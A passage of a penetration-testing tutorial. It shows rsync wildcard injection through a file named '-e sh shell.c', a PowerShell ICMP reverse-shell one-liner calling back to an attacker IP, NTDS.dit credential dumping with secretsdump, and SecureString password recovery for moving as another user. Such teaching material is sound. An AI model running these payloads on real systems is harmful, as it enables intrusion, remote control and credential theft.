<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
<p>Now root will try to copy all C files to the remote server.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># rsync -t *.c foo:src/</span>

<span class="n">rsync</span><span class="p">:</span> <span class="n">connection</span> <span class="n">unexpectedly</span> <span class="n">closed</span> <span class="p">(</span><span class="mi">0</span> <span class="nb">bytes</span> <span class="n">received</span> <span class="n">so</span> <span class="n">far</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="p">]</span>
<span class="n">rsync</span> <span class="n">error</span><span class="p">:</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">rsync</span> <span class="n">protocol</span> <span class="n">data</span> <span class="n">stream</span> <span class="p">(</span><span class="n">code</span> <span class="mi">12</span><span class="p">)</span> <span class="n">at</span> <span class="n">io</span><span class="o">.</span><span class="n">c</span><span class="p">(</span><span class="mi">601</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="o">=</span><span class="mf">3.0.8</span><span class="p">]</span>
</pre></div>
</div>
<p>Let’s see what happened…</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">76</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>There were two files owned by user ‘leon’, as listed below.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
<p>After ‘rsync’ execution, new file shell_output.txt whose owner is root is created in same directory.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>If we check its content, following data is found.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell_output.txt</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
</pre></div>
</div>
<p>Trick is that because of the ‘*.c’ wildcard, ‘rsync’ got ‘-e sh shell.c’ option on command line, and shell.c will be executed upon’rsync’ start. Content of shell.c is presented below.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.c</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span> <span class="o">&gt;</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="tips-and-tricks">
<span id="id23"></span><h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Link to this heading"></a></h2>
<section id="windows">
<h3>Windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h3>
<section id="get-childitem-mode-values">
<h4>Get-ChildItem Mode Values<a class="headerlink" href="#get-childitem-mode-values" title="Link to this heading"></a></h4>
<p>‘Mode’ values returned by PowerShell’s Get-ChildItem cmdlet?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span><span class="o">&gt;</span> <span class="n">gci</span><span class="o">|</span><span class="n">select</span> <span class="n">mode</span><span class="p">,</span><span class="n">attributes</span> <span class="o">-</span><span class="n">u</span>

<span class="n">Mode</span>                <span class="n">Attributes</span>
<span class="o">----</span>                <span class="o">----------</span>
<span class="n">d</span><span class="o">-----</span>               <span class="n">Directory</span>
<span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>     <span class="n">ReadOnly</span><span class="p">,</span> <span class="n">Directory</span>
<span class="n">d</span><span class="o">----</span><span class="n">l</span> <span class="n">Directory</span><span class="p">,</span> <span class="n">ReparsePoint</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>                 <span class="n">Archive</span>
</pre></div>
</div>
<p>In any case, the full list is:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">d</span> <span class="o">-</span> <span class="n">Directory</span>
<span class="n">a</span> <span class="o">-</span> <span class="n">Archive</span>
<span class="n">r</span> <span class="o">-</span> <span class="n">Read</span><span class="o">-</span><span class="n">only</span>
<span class="n">h</span> <span class="o">-</span> <span class="n">Hidden</span>
<span class="n">s</span> <span class="o">-</span> <span class="n">System</span>
<span class="n">l</span> <span class="o">-</span> <span class="n">Reparse</span> <span class="n">point</span><span class="p">,</span> <span class="n">symlink</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span>
</pre></div>
</div>
</section>
<section id="zip-or-unzip-using-only-windows-built-in-capabilities">
<h4>Zip or unzip using ONLY Windows’ built-in capabilities?<a class="headerlink" href="#zip-or-unzip-using-only-windows-built-in-capabilities" title="Link to this heading"></a></h4>
<p>Powershell way</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">A</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">FileSystem</span>
<span class="p">[</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">]::</span><span class="n">CreateFromDirectory</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">,</span> <span class="s1">&#39;foo.zip&#39;</span><span class="p">)</span>
<span class="p">[</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="s1">&#39;foo.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;bar&#39;</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="alternate-data-stream">
<h4>Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Link to this heading"></a></h4>
<p>Sometimes, <a class="reference external" href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">Alternate Data Stream</a> can be used to hide data in streams.</p>
<p>The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).</p>
<p>Powershell-Way</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS &gt; Get-Item -Path C:\Users\Administrator\example.zip -stream *

Filename: C:\Users\Administrator\example.zip

Stream             Length
------             -------
:$DATA             8
pass.txt           4
</pre></div>
</div>
<p>Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
The password is Passw0rd!
</pre></div>
</div>
<p>Check a directory for ADS?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;
</pre></div>
</div>
<p>DIR Way</p>
<p>Current directory ADS Streams</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span> <span class="o">/</span><span class="n">r</span> <span class="o">|</span> <span class="n">find</span> <span class="s2">&quot;:$DATA&quot;</span>
</pre></div>
</div>
<p>Sub-directories too</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span>   <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">r</span> <span class="o">|</span> <span class="n">find</span> <span class="s2">&quot;:$DATA&quot;</span>
</pre></div>
</div>
<p>Reading the hidden stream</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>more &lt; testfile.txt:hidden_stream::$DATA
</pre></div>
</div>
<p>We may also utilze <a class="reference external" href="https://github.com/codejanus/ToolSuite/blob/master/lads.exe">List Alternate Data Streams</a> LADS tool to figure out Alternate Data Streams.</p>
</section>
<section id="redirecting-standard-out-and-standard-error-from-powershell-start-process">
<h4>Redirecting Standard Out and Standard Error from PowerShell Start-Process<a class="headerlink" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process" title="Link to this heading"></a></h4>
<p>Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">Start</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">FilePath</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">foo</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">NoNewWindow</span> <span class="o">-</span><span class="n">PassThru</span> <span class="o">-</span><span class="n">Wait</span> <span class="o">-</span><span class="n">RedirectStandardOutput</span> <span class="n">stdout</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">RedirectStandardError</span> <span class="n">stderr</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process">Powershell Start-Process Module Documentation</a>.</p>
</section>
<section id="ntds-dit-and-system-hive">
<h4>NTDS.dit and SYSTEM hive<a class="headerlink" href="#ntds-dit-and-system-hive" title="Link to this heading"></a></h4>
<p>If you have found files such as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">IP_psexec</span><span class="o">.</span><span class="n">ntdsgrab</span><span class="o">.</span><span class="n">_333512</span><span class="o">.</span><span class="n">dit</span><span class="p">:</span> <span class="n">Extensible</span> <span class="n">storage</span> <span class="n">engine</span> <span class="n">DataBase</span><span class="p">,</span> <span class="n">version</span> <span class="mh">0x620</span><span class="p">,</span> <span class="n">checksum</span> <span class="mh">0x16d44752</span><span class="p">,</span> <span class="n">page</span> <span class="n">size</span> <span class="mi">8192</span><span class="p">,</span> <span class="n">DirtyShutdown</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">version</span> <span class="mf">6.1</span>
<span class="n">IP_psexec</span><span class="o">.</span><span class="n">ntdsgrab</span><span class="o">.</span><span class="n">_089134</span><span class="o">.</span><span class="n">bin</span><span class="p">:</span> <span class="n">MS</span> <span class="n">Windows</span> <span class="n">registry</span> <span class="n">file</span><span class="p">,</span> <span class="n">NT</span><span class="o">/</span><span class="mi">2000</span> <span class="ow">or</span> <span class="n">above</span>
</pre></div>
</div>
<p>Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">ntds</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds_cracking</span><span class="o">/</span><span class="n">ntds</span><span class="o">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">system</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds_cracking</span><span class="o">/</span><span class="n">systemhive</span> <span class="n">LOCAL</span>
</pre></div>
</div>
</section>
<section id="icmp-shell">
<h4>ICMP Shell<a class="headerlink" href="#icmp-shell" title="Link to this heading"></a></h4>
<p>Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use <a class="reference external" href="https://github.com/inquisb/icmpsh">Simple reverse ICMP Shell</a> However, this requires the executable to be present on the system. There’s a powershell version of <a class="reference external" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">ICMP Reverse Shell</a> Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">nop</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;$ip=&#39;your_ip&#39;; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;OK&#39;), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;&#39;), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }&quot;</span>
</pre></div>
</div>
<p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
<ul class="simple">
<li><p>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer <a class="reference external" href="https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/">PowerShell –EncodedCommand and Round-Trips</a></p></li>
<li><p>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">Content</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span> <span class="s2">&quot;Base64 encoded content&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Once the base64-encoded data is transferred, we can utilize <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx">certutil</a> from Microsoft to decode the base64-encoded to normal file.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">certutil</span> <span class="o">&lt;-</span><span class="n">decode</span><span class="o">/</span> <span class="o">-</span><span class="n">encode</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nb">input</span> <span class="n">file</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">output</span> <span class="n">file</span><span class="o">&gt;</span>
<span class="o">-</span><span class="n">decode</span> <span class="n">Decode</span> <span class="n">a</span> <span class="n">Base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">file</span>
<span class="o">-</span><span class="n">encode</span> <span class="n">Encode</span> <span class="n">a</span> <span class="n">file</span> <span class="n">to</span> <span class="n">Base64</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.</p></li>
<li><p>Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let’s say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$username = &#39;UsernameHere&#39;;
$password = &#39;PasswordHere&#39;;
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>Once, we have created a PSCredential, we can use <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command">Invoke-Command</a>  to execute command as that user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
-ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn&#39;t work.
</pre></div>
</div>
</li>
<li><p>Possibly, we can execute the ICMP Shell code to get the shell as the new user.</p></li>
<li><p>One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.</p>
<ul class="simple">
<li><p>Check powershell processes with Show-Process</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Show</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">Name</span> <span class="o">*</span><span class="n">power</span><span class="o">*</span> <span class="s2">&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Note down  the PID</p></li>
<li><p>Execute shell as the different user</p></li>
<li><p>Stop-Process the previous PID</p></li>
</ul>
</li>
</ul>
</section>
<section id="recovering-password-from-system-security-securestring">
<h4>Recovering password from System.Security.SecureString<a class="headerlink" href="#recovering-password-from-system-security-securestring" title="Link to this heading"></a></h4>
<p>If we have windows credentials stored as System.Security.SecureString, we can use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$UnsecurePassword = (New-Object PSCredential &quot;user&quot;,$SecurePassword).GetNetworkCredential().Password
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS&gt; $PlainPassword = Read-Host -AsSecureString  &quot;Enter password&quot;
PS&gt; Enter password: ***
PS&gt; $PlainPassword
PS&gt; System.Security.SecureString
PS&gt; $UnsecurePassword1 = (New-Object PSCredential &quot;user&quot;,$PlainPassword).GetNetworkCredential().Password
PS&gt; $UnsecurePassword1
PS&gt; yum
</pre></div>
</div>
</section>
<section id="copy-to-or-from-a-powershell-session">
<h4>Copy To or From a PowerShell Session<a class="headerlink" href="#copy-to-or-from-a-powershell-session" title="Link to this heading"></a></h4>
<p>This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from <a class="reference external" href="https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/">Copy To or From a PowerShell Session</a></p>
<ul class="simple">
<li><p>Copy Local files to a remote session :</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>##Initialize the session
$TargetSession = New-PSSession -ComputerName HALOMEM03

##  Copy Files from Local session to remote session
Copy-Item -ToSession $TargetSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator.HALO\desktop\&quot; -Recurse
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>Copy some files from a remote session to the local server:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>## Create the session
$SourceSession = New-PSSession -ComputerName HALODC01

## Copy from Remote machine to Local machine
Copy-Item -FromSession $SourceSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator\desktop\&quot; -Recurse
</pre></div>
</div>
</li>
</ul>
</section>
<section id="get-hash">
<h4>Get-Hash<a class="headerlink" href="#get-hash" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash">Get-FileHash</a> Computes the hash value for a file by using a specified hash algorithm.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">FileHash</span> <span class="n">Hello</span><span class="o">.</span><span class="n">rst</span>

<span class="n">Algorithm</span>       <span class="n">Hash</span>                                                                   <span class="n">Path</span>
<span class="o">---------</span>       <span class="o">----</span>                                                                   <span class="o">----</span>
<span class="n">SHA256</span>          <span class="mi">8</span><span class="n">A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC</span>       <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">Hello</span><span class="o">.</span><span class="n">rst</span>
</pre></div>
</div>
</section>
<section id="active-directory-enumeration-and-remote-code-execution">
<h4>Active Directory Enumeration and Remote Code Execution<a class="headerlink" href="#active-directory-enumeration-and-remote-code-execution" title="Link to this heading"></a></h4>
<p>Probably, refer  <span class="xref std std-doc">LFF-IPS-P3-Exploitation</span></p>
<p>It contains</p>
<ul class="simple">
<li><p>Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.</p></li>
<li><p>Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.</p></li>
</ul>
</section>
<section id="others">
<h4>Others<a class="headerlink" href="#others" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Invoking Net Use using Credentials to mount remote system</p></li>
</ul>
<blockquote>
